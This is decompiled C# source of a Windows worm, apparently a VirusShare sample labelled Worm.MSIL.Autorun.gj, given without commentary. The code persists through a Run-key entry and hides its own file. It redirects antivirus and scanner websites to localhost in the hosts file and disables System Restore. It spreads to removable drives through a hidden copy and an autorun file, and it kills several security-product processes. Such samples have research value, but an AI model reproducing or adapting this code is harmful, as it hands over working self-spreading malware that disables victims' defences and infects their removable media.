// Decompiled with JetBrains decompiler
// Type: A.c932a1f46175f5cf10cc37a85a6e7125d
// Assembly: Themes, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F1CED465-DC2F-40DF-8008-E1A5BA91B6DC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.gj-eafdf0c256b415039327b1617f1f280eb22975e5d3328254127f60f9f6fa09f7.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace A
{
  internal class c932a1f46175f5cf10cc37a85a6e7125d
  {
    [DebuggerNonUserCode]
    public c932a1f46175f5cf10cc37a85a6e7125d()
    {
    }

    public static void c610d70fa06caec4ea1fd0dcb9fa1922d()
    {
      try
      {
        string destFileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Themes\\Defauts.exe";
        File.Copy(Application.ExecutablePath, destFileName);
        c30e9ce1723309388c2f394ed917c50ee.c4cbf5def1ec25fd5a1ea2a78ef4a52ce.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("1" + Application.ProductName, (object) destFileName);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void cb277ba5015674c97518f587edbc92f62()
    {
      try
      {
        File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void c9b1ff1d99f8ebf4b168dc9510477b62e()
    {
      try
      {
        StreamWriter streamWriter = new StreamWriter("C:\\Windows\\System32\\drivers\\etc\\hosts", true);
        string str1 = "\n 127.0.0.1 www.virustotal.com";
        string str2 = "\n 127.0.0.1 www.bitdefender.com";
        string str3 = "\n 127.0.0.1 www.virusscan.jotti.org";
        string str4 = "\n 127.0.0.1 www.scanner.novirusthanks.org";
        streamWriter.Write(str1);
        streamWriter.Write("\r\n" + str2);
        streamWriter.Write("\r\n" + str3);
        streamWriter.Write("\r\n" + str4);
        streamWriter.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void cc5ca76e62b2657a9c5de87bca8c6252a()
    {
      try
      {
        c30e9ce1723309388c2f394ed917c50ee.c4cbf5def1ec25fd5a1ea2a78ef4a52ce.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object) "1", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void c2df6a58a7a03f5c82ec6bbbb0de301e3()
    {
      try
      {
        c30e9ce1723309388c2f394ed917c50ee.c4cbf5def1ec25fd5a1ea2a78ef4a52ce.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "0", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void c3bb934f714a149fb300ebf1174d491cc()
    {
      string[] logicalDrives = Environment.GetLogicalDrives();
      int num = checked (logicalDrives.Length - 1);
      int index = 0;
      while (index <= num)
      {
        DriveInfo driveInfo = new DriveInfo(logicalDrives[index]);
        if (driveInfo.DriveType == DriveType.Removable)
        {
          if (driveInfo.IsReady)
          {
            try
            {
              if (!File.Exists(logicalDrives[index] + "UNrestor.exe"))
              {
                File.Copy(Path.GetFileName(Application.ExecutablePath), logicalDrives[index] + "UNrestor", true);
                c30e9ce1723309388c2f394ed917c50ee.c4cbf5def1ec25fd5a1ea2a78ef4a52ce.FileSystem.WriteAllText(logicalDrives[index] + "Boot.inf", "[autorun]" + Environment.NewLine + "open=" + logicalDrives[index] + "UNrestor" + Environment.NewLine + "shellexecute=" + logicalDrives[index], true);
                File.SetAttributes(logicalDrives[index] + "UNrestor", FileAttributes.Hidden);
                File.SetAttributes(logicalDrives[index] + "Boot.inf", FileAttributes.Hidden);
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        checked { ++index; }
      }
    }

    public static void c2b4ae42c382bedf73a5b12a116110530()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "outpost", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void c81a770e19eeef3c8220cf12174eacb00()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "npfmsg", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void c830b6a83557b605c38daa1c177c07323()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "bdagent", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void c47923cb2d7999053fdd17c676cc912a8()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "egui", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void cf63283c1ff1a704e9676e0b4e7d245a7()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "zlclient", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }
  }
}
